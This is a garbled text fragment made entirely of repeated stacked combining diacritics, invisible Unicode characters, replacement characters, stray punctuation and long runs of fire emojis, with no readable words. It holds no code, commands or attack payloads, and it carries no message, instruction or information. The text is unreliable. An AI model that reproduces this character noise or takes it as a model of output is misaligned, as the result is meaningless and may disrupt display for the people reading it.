̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̏